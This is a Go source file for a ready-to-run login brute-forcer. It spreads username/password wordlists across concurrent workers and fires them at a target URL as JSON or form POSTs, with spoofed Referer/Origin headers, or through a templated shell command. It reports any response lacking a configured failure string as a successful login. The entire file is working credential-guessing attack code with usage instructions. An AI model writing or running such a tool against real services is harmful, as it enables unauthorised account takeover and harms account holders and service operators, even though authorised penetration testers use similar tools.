package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const ClearLine = "\033[2K"

var spinner = []string{"◐", "◓", "◑", "◒"}
var extraBody = flag.String("b", "", "Extra body in the form of key=value&key2=value2")
var failedText = flag.String("f", "", "If this text is in the response, the login failed")
var verbose = flag.Bool("v", false, "Verbose")
var total = 0
var current = 0
var failedTexts []string

type response struct {
	Username string
	Password string
	Status   string
}

func main() {
	fmt.Println()
	url := flag.String("t", "http://localhost", "The POST URL")
	userfile := flag.String("u", "usernames.txt", "Usernames.txt file")
	passfile := flag.String("p", "passwords.txt", "Passwords.txt file")
	mode := flag.String("m", "", "Mode: json, form, cmd")
	usernameField := flag.String("n", "username", "Username field name")
	passwordField := flag.String("s", "password", "Password field name")
	workers := flag.Int("w", 1, "Number of workers")
	flag.Parse()

	if *userfile == "" || *passfile == "" || *mode == "" {
		fmt.Println("Usage: go run main.go -t <url> -u <usernames.txt> -p <passwords.txt> -m <json|form> -n <usernameField> -s <passwordField> -w <workers>")
		fmt.Println("Example: go run main.go -t http://localhost/login -u usernames.txt -p passwords.txt -m json -n username -s password -w 10")
		return
	}
	if *mode != "json" && *mode != "form" && *mode != "cmd" {
		panic("Mode not supported")
	}
	if *failedText == "" {
		panic("Failed text must be specified")
	}

	usernames := readIn(*userfile)
	passwords := readIn(*passfile)
	total = len(usernames) * len(passwords)
	failedTexts = strings.Split(*failedText, ",")

	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go worker(&wg, *workers, i, *url, usernames, passwords, *mode, *usernameField, *passwordField)
	}
	go updateProgress()
	wg.Wait()
}

var loaderIndex = 0
var lastProgress = 0

func updateProgress() {
	for range time.Tick(time.Millisecond * 500) {
		speed := current - lastProgress
		fmt.Printf("\n\033[1A\033[K Progress: %d%% %s %d/ops", current*100/total, spinner[loaderIndex], speed*2)
		lastProgress = current
		loaderIndex++
		if loaderIndex == len(spinner) {
			loaderIndex = 0
		}
	}
}

func readIn(passwordFile string) []string {
	b, err := ioutil.ReadFile(passwordFile)
	panicOnErr(err)
	return strings.Split(string(b), "\n")
}

// worker process a batch of usernames and passwords divieded by the number of cores
func worker(wg *sync.WaitGroup, workers, workerNum int, url string, usernames, passwords []string, mode, usernameField, passwordField string) {
	defer wg.Done()
	for i := workerNum; i < len(usernames); i += workers {
		for _, password := range passwords {
			if mode == "json" {
				postToURLJson(url, usernames[i], password, usernameField, passwordField)
			} else if mode == "form" {
				postToURLForm(url, usernames[i], password, usernameField, passwordField)
			} else if mode == "cmd" {
				executeCommand(url, usernames[i], password, usernameField, passwordField)
			}
			current++
		}
	}
}

func postToURLJson(url, username, password, usernameField, passwordField string) {
	var jsn = map[string]string{
		usernameField: username,
		passwordField: password,
	}
	if *extraBody != "" {
		for _, v := range strings.Split(*extraBody, ",") {
			kv := strings.Split(v, "=")
			jsn[kv[0]] = kv[1]
		}
	}
	jsonStr, err := json.Marshal(jsn)
	panicOnErr(err)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	panicOnErr(err)
	defer resp.Body.Close()

	for _, v := range failedTexts {
		body, err := io.ReadAll(resp.Body)
		panicOnErr(err)
		if strings.Contains(string(body), v) {
			return
		}
	}
	fmt.Println("Successfully logged in: ", username, password)
}

func postToURLForm(posturl, username, password, usernameField, passwordField string) {
	URI, err := url.Parse(posturl)
	if err != nil {
		panic(err)
	}
	withHeaders := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer":      URI.Scheme + "://" + URI.Host,
		"Origin":       URI.Scheme + "://" + URI.Host,
	}
	form := url.Values{}
	form.Add(usernameField, username)
	form.Add(passwordField, password)
	if *extraBody != "" {
		for _, v := range strings.Split(*extraBody, "&") {
			kv := strings.Split(v, "=")
			form.Add(kv[0], kv[1])
		}
	}
	req, err := http.NewRequest("POST", posturl, strings.NewReader(form.Encode()))
	panicOnErr(err)
	for k, v := range withHeaders {
		req.Header.Set(k, v)
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	panicOnErr(err)
	defer resp.Body.Close()

	for _, v := range failedTexts {
		body, err := io.ReadAll(resp.Body)
		panicOnErr(err)
		if strings.Contains(string(body), v) {
			return
		}
	}
	fmt.Println("Successfully logged in: ", username, password)
}

func executeCommand(command, username, password, usernameField, passwordField string) {
	commandF := strings.Replace(command, usernameField, username, -1)
	commandF = strings.Replace(commandF, passwordField, password, -1)
	cmd := exec.Command(strings.Split(commandF, " ")[0], strings.Split(commandF, " ")[1:]...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil && *verbose {
		fmt.Println(err)
	}
	for _, v := range failedTexts {
		if strings.Contains(out.String(), v) {
			return
		}
	}
	fmt.Println("Successfully executed: ", username, password, out.String())
}

func panicOnErr(err error) {
	if err != nil {
		panic(err)
	}
}
